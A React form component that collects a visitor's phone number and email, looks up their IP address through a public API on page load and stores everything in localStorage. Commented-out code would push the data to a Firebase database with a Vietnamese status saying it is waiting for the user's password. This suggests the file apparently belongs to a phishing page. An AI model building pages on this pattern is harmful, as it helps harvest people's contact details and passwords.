/* eslint-disable react/jsx-key */
import { useEffect, useState } from "react";

import PhoneInput from "react-phone-input-2";
import "react-phone-input-2/lib/bootstrap.css";
import Modal from "../Modal/Modal_v2";
import Spinner from "../Spinner";
import InputText from "../UI/InputText/InputText";
import "./Form.scss";

const months = [
  "Jan",
  "Feb",
  "Mar",
  "Apr",
  "May",
  "Jun",
  "Jul",
  "Aug",
  "Sep",
  "Oct",
  "Nov",
  "Dec",
];

const Form = () => {
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    day: "",
    month: "",
    year: "",
    phone: "",
  });
  const [formSubmit, setFormSubmit] = useState(false);
  const [isModal, setIsModal] = useState(false);
  const isDataCorrect = () => {
    const mailMask =
      /^(([^<>()\[\]\.,;:\s@\"]+(\.[^<>()\[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()[\]\.,;:\s@\"]+\.)+[^<>()[\]\.,;:\s@\"]{2,})$/i;
    const { email } = formData;
    return mailMask.test(email);
  };
  const isFormDataComplete = () => {
    const { email, phone, day, month, year } = formData;
    return (
      email.trim() !== "" && phone.trim() !== "" && phone.trim().length > 9
      //  &&
      // day?.trim() !== "" &&
      // month?.trim() !== "" &&
      // year?.trim() !== ""
    );
  };
  useEffect(() => {
    if (isFormDataComplete()) {
      if (isDataCorrect()) {
        setFormSubmit(true);
      }
    } else if (formSubmit && !isFormDataComplete()) {
      setFormSubmit(false);
    }
  }, [formData]);

  const handleChange = (event) => {
    const { name, value } = event.target;
    setFormData((state) => ({
      ...state,
      [name]: value,
    }));
  };

  const handleUserIP = () => {
    fetch("https://api.db-ip.com/v2/free/self/")
      .then((res) => res.json())
      .then((json) => {
        localStorage.setItem("ip", json.ipAddress);
      });
  };

  const handleSubmit = async () => {
    setLoading(true);
    // const id = uuidv4();
    // set(ref(database, "/" + id), {
    //   email: formData.email,
    //   phone: formData.phone,
    //   user_status: "Đang chờ user nhập nhật khẩu",
    //   done: false,
    //   timestamp: Date.now(),
    // })
    //   .then(() => {
    localStorage.setItem("form", JSON.stringify(formData));
    // localStorage.setItem("record_uid", id);

    setTimeout(() => {
      setLoading(false);
      setIsModal(true);
    }, 1000);
    //     })
    //     .catch((err) => {
    //       console.log("Error", err);
    //     });
  };

  useEffect(() => {
    handleUserIP();
  }, []);

  return (
    <form className="Form" onSubmit={(e) => e.preventDefault()}>
      {loading && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            zIndex: 999,
            background: "rgba(0,0,0,.1",
          }}
        >
          <Spinner />
        </div>
      )}
      {/* <InputText name="fullname" fun={handleChange} placeHolder={"Fullname"}>
        Fullname
      </InputText> */}

      {/* <div>
        <label className="InputText__label">Date of birth</label>
        <div
          style={{
            display: "flex",
            marginBottom: 20,
          }}
        >
          <select
            onChange={handleChange}
            className="form-select form-select-lg me-2"
            name="day"
          >
            <option>Day</option>
            {Array.from({ length: 31 }).map((_, idx) => (
              <option key={idx} value={idx + 1}>
                {idx + 1}
              </option>
            ))}
          </select>
          <select
            onChange={handleChange}
            className="form-select form-select-lg me-2"
            placeholder="Month"
            name="month"
          >
            <option>Month</option>
            {months.map((data) => (
              <option value={data}>{data}</option>
            ))}
          </select>
          <select
            onChange={handleChange}
            className="form-select form-select-lg me-2"
            placeholder="Year"
            name="year"
          >
            <option>Year</option>
            {Array.from({ length: 150 }).map((_, idx) => (
              <option key={idx} value={2023 - idx}>
                {2023 - idx}
              </option>
            ))}
          </select>
        </div>
      </div> */}

      {/* <InputText name="phone" fun={handleChange} placeHolder={"Phone number"}>
        Phone number
      </InputText> */}
      <div
        style={{
          marginBottom: 20,
        }}
      >
        <label className="InputText__label">Phone number</label>
        <PhoneInput
          country={"us"}
          value={formData.phone}
          onChange={(phone) =>
            setFormData({
              ...formData,
              phone,
            })
          }
        />
      </div>

      <InputText name="email" fun={handleChange} placeHolder={"Email address"}>
        Email address
      </InputText>

      <Modal isModal={isModal} setIsModal={setIsModal} />
      {/* <ButtonSoft disabled={formSubmit} fun={handleSubmit}>
        Continue
      </ButtonSoft> */}
      <div className="d-flex justify-content-end">
        <button
          className="chat_btn"
          disabled={!formSubmit}
          onClick={handleSubmit}
        >
          <ion-icon name="chatbubble"></ion-icon>
          <span>Start Chat</span>
        </button>
      </div>
    </form>
  );
};

export default Form;
